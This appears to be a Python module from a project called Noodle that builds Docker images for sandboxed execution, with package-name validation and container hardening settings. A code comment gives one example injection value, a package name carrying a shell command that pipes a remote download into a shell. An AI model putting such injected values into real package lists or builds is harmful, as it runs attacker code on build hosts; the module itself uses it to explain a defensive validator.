"""Shared container-spawning machinery (sandbox executor + docker provider).

Per-env image builds with RD-2 package validation, schema-versioned image
tags, the isolation-runtime probe, and the hardened ``containers.run``
keyword set live here so a hardening fix lands on every container Noodle
ever spawns. No DB access; safe to import from worker_main.
"""

from __future__ import annotations

import io
import logging
import re
import tarfile
from pathlib import Path
from typing import Any

from app.config import settings

logger = logging.getLogger(__name__)

# Bump whenever the generated Dockerfile changes shape — stale images built
# from the old recipe (e.g. root-running v1 images, PyPI-installing v2 images)
# must never be reused.
IMAGE_SCHEMA_VERSION = "v3"

# RD-2: ``ensure_docker_image`` interpolates the env's package list and Python
# version straight into a shell ``RUN uv pip install`` / ``FROM python:`` line in
# the generated Dockerfile. Shell metacharacters in a package name (e.g.
# ``"foo; curl evil | sh"``) would otherwise execute at build time. The env is
# admin-controlled (``environment:write``), but we validate as defence-in-depth.
# Each requirement is restricted to a PEP 508 name + optional extras + optional
# version specifiers using only characters that cannot break out of the shell
# word (no spaces, quotes, ``;``, ``|``, ``&``, ``$``, ``()``, backticks, …).
_PKG_SPEC_RE = re.compile(
    r"^[A-Za-z0-9][A-Za-z0-9._-]*"                      # distribution name
    r"(\[[A-Za-z0-9._,-]+\])?"                          # optional extras
    r"((===|==|!=|<=|>=|~=|<|>)[A-Za-z0-9._-]+"         # first version specifier
    r"(,(===|==|!=|<=|>=|~=|<|>)[A-Za-z0-9._-]+)*)?$"   # further specifiers
)
_PY_VERSION_RE = re.compile(r"^[0-9]+(\.[0-9]+){0,2}$")


def _validate_packages(packages: list[str]) -> list[str]:
    """Return the validated package specifiers or raise ``ValueError`` (RD-2)."""
    safe: list[str] = []
    for raw in packages:
        spec = str(raw).strip()
        if not spec:
            continue
        if not _PKG_SPEC_RE.match(spec):
            raise ValueError(
                f"invalid package specifier {spec!r}: only PEP 508 name/extras/"
                "version specifiers are allowed (no shell metacharacters)"
            )
        safe.append(spec)
    return safe


def _validate_python_version(version: str) -> str:
    """Return a validated ``X[.Y[.Z]]`` Python version or raise ``ValueError`` (RD-2)."""
    v = str(version or "").strip()
    if not _PY_VERSION_RE.match(v):
        raise ValueError(f"invalid python_version {version!r}: expected e.g. '3.12'")
    return v


# Spawn kwargs every Noodle-launched container gets. Resource ceilings are
# overridable (per runner-pool provider_config, later per org_limits); the
# security floor — cap_drop / no-new-privileges / read-only rootfs — is not.
_OVERRIDABLE = ("mem_limit", "nano_cpus", "pids_limit", "tmpfs", "network", "ulimits")


def hardening_kwargs(
    *, runtime: str, network: str, overrides: dict | None = None
) -> dict[str, Any]:
    kw: dict[str, Any] = {
        "cap_drop": ["ALL"],
        "security_opt": ["no-new-privileges:true"],
        "read_only": True,
        "tmpfs": {"/tmp": f"size={settings.sandbox_tmpfs_size}"},
        "mem_limit": settings.sandbox_mem_limit,
        "nano_cpus": int(settings.sandbox_cpu_limit * 1_000_000_000),
        "pids_limit": settings.sandbox_pids_limit,
        "network": network,
        "runtime": runtime,
        # Tini init process reaps zombies inside the container (PID 1 problem).
        "init": True,
        # Ulimit caps — bound open files and child processes per container.
        "ulimits": [
            {"name": "nofile", "soft": 1024, "hard": 4096},
            {"name": "nproc", "soft": 256, "hard": 512},
        ],
        # rootfs is read-only; /tmp is the only writable surface.
        "environment": {"HOME": "/tmp"},
    }
    for key, value in (overrides or {}).items():
        if key in _OVERRIDABLE:
            kw[key] = value
    return kw


def ensure_sandbox_network(client: Any, name: str | None = None) -> str:
    """Get-or-create the dedicated bridge network. Handles the two-workers-
    racing-to-create case by re-checking after a failed create."""
    name = name or settings.sandbox_network
    try:
        client.networks.get(name)
        return name
    except Exception:  # noqa: BLE001 — NotFound
        pass
    try:
        client.networks.create(name, driver="bridge")
        return name
    except Exception as exc:  # noqa: BLE001 — possibly a concurrent create
        try:
            client.networks.get(name)
            return name
        except Exception:  # noqa: BLE001
            raise RuntimeError(
                f"could not create sandbox network {name!r}: {exc}"
            ) from exc


class DockerStreamDemuxer:
    """Strips multiplex frame headers from a no-TTY attach stream.

    Containers spawned without a TTY get their output multiplexed: each frame
    is an 8-byte header — stream type (1=stdout, 2=stderr), three zero bytes,
    big-endian payload length — followed by the payload. Frames split across
    recv() boundaries, so feed() buffers until a frame completes.
    """

    def __init__(self) -> None:
        self._buf = b""

    def feed(self, chunk: bytes) -> bytes:
        self._buf += chunk
        out = b""
        while len(self._buf) >= 8:
            size = int.from_bytes(self._buf[4:8], "big")
            if len(self._buf) < 8 + size:
                break
            out += self._buf[8:8 + size]
            self._buf = self._buf[8 + size:]
        return out


def attach_raw_socket(sock: Any) -> Any:
    """Unwrap ``container.attach_socket()`` to the raw recv/sendall object.

    Unix daemons return a ``SocketIO`` wrapping the real socket at ``._sock``;
    Windows named-pipe daemons return a bare ``NpipeSocket`` that already
    exposes recv/sendall/settimeout itself.
    """
    return getattr(sock, "_sock", sock)


def image_tag_for(env_payload: dict) -> str:
    return (
        f"noodle-env:{env_payload.get('id', 'default')}"
        f"-{env_payload.get('packages_hash', 'latest')}"
        f"-{IMAGE_SCHEMA_VERSION}"
    )


_RUNTIME_PREFERENCE = ("kata", "runsc", "runc")  # strongest first
_VALID_RUNTIMES = ("auto", "runc", "runsc", "kata")


def detect_runtime(client: Any, configured: str) -> str:
    """Resolve the isolation runtime for this daemon. Sync — call at startup.

    Explicit values fail fast when the daemon doesn't list them; ``auto``
    picks the strongest available. ``runc`` is the daemon default and is
    treated as always present (some daemons omit it from info()).
    """
    if configured not in _VALID_RUNTIMES:
        raise ValueError(
            f"invalid sandbox_runtime={configured!r}: expected one of {_VALID_RUNTIMES}"
        )
    info = client.info() or {}
    available = set((info.get("Runtimes") or {}).keys()) | {"runc"}
    if configured != "auto":
        if configured not in available:
            raise RuntimeError(
                f"sandbox_runtime={configured!r} is not installed on this Docker "
                f"daemon (available: {sorted(available)}). Install it or use 'auto'."
            )
        return configured
    for candidate in _RUNTIME_PREFERENCE:
        if candidate in available:
            return candidate
    return "runc"


# The noodle packages are not published to PyPI: the base image installs them
# from the workspace source, shipped to the daemon in the build context. Env
# images are thin layers (extra pip packages only) on top of this base.
_BASE_PACKAGES = ("core", "nodes", "runtime")
_TAR_EXCLUDE = ("__pycache__", ".pytest_cache", ".venv", ".git", "node_modules")


def base_image_tag(python_version: str) -> str:
    return f"noodle-runtime-base:{python_version}-{IMAGE_SCHEMA_VERSION}"


def _workspace_root() -> Path:
    # …/apps/api/app/services/container_runtime.py → repo root four levels up.
    # Holds both on a source checkout and in the deploy image (uv sync installs
    # the workspace editable, so __file__ stays under /app).
    root = Path(__file__).resolve().parents[4]
    if not (root / "packages" / "runtime" / "pyproject.toml").is_file():
        raise RuntimeError(
            f"cannot locate the noodle workspace source under {root} — the "
            "sandbox base image is built from packages/{core,nodes,runtime}, "
            "which must ship alongside the worker"
        )
    return root


def _tar_filter(info: tarfile.TarInfo) -> tarfile.TarInfo | None:
    parts = info.name.split("/")
    if any(p in _TAR_EXCLUDE or p == "tests" for p in parts):
        return None
    if info.name.endswith(".pyc"):
        return None
    return info


def _base_build_context(dockerfile: str, root: Path) -> io.BytesIO:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tar:
        data = dockerfile.encode()
        df_info = tarfile.TarInfo("Dockerfile")
        df_info.size = len(data)
        tar.addfile(df_info, io.BytesIO(data))
        for pkg in _BASE_PACKAGES:
            tar.add(root / "packages" / pkg, arcname=f"packages/{pkg}",
                    filter=_tar_filter)
    buf.seek(0)
    return buf


def ensure_base_image(client: Any, python_version: str) -> str:
    """Build the workspace-source base image if absent. Sync — run_in_executor."""
    python_version = _validate_python_version(python_version)
    tag = base_image_tag(python_version)
    try:
        client.images.get(tag)
        return tag  # cache hit
    except Exception:  # noqa: BLE001 — NotFound; build below
        pass

    # Non-root: installs run as root, the runtime does not. HOME is /tmp at
    # runtime (tmpfs) because the rootfs — including /home — is read-only.
    src = "/opt/noodle-src/packages"
    dockerfile = (
        f"FROM python:{python_version}-slim\n"
        "RUN pip install uv --quiet\n"
        f"COPY packages {src}\n"
        f"RUN uv pip install --system "
        + " ".join(f"{src}/{pkg}" for pkg in _BASE_PACKAGES) + "\n"
        "RUN useradd --uid 65532 --create-home --shell /usr/sbin/nologin noodle\n"
        "USER noodle\n"
        'ENTRYPOINT ["python", "-u", "-m", "noodle_runtime"]\n'
    )
    context = _base_build_context(dockerfile, _workspace_root())
    client.images.build(fileobj=context, custom_context=True, tag=tag, rm=True)
    logger.info("built sandbox base image %s", tag)
    return tag


def ensure_docker_image(client: Any, image_tag: str, env_payload: dict) -> None:
    """Build the env image if absent. Sync — call via run_in_executor."""
    try:
        client.images.get(image_tag)
        return  # cache hit
    except Exception:  # noqa: BLE001 — NotFound; build below
        pass

    python_version = _validate_python_version(env_payload.get("python_version", "3.12"))
    packages = _validate_packages(env_payload.get("packages") or [])
    base = ensure_base_image(client, python_version)

    dockerfile = f"FROM {base}\n"
    if packages:
        dockerfile += (
            "USER root\n"
            f"RUN uv pip install --system {' '.join(packages)}\n"
            "USER noodle\n"
        )

    client.images.build(fileobj=io.BytesIO(dockerfile.encode()), tag=image_tag, rm=True)
    logger.info("built docker image %s", image_tag)
